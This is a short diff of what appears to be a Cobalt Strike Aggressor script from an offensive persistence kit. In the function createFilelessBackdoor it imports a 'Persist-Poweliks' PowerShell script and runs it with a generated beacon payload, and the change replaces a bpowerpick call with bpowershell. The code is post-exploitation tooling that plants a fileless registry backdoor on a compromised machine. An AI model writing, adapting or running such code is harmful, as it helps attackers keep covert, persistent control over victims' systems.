@@ -33,7 +33,7 @@ sub createFilelessBackdoor{
 	binput($bid, "powershell-import Persist-Poweliks.ps1");
 	bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
 	binput($bid, "powershell Persist-Poweliks");
-	bpowerpick($bid, "Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \"");
+	bpowershell($bid, "Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \"");
 }
 
 # Returns a string to use for the reg key name
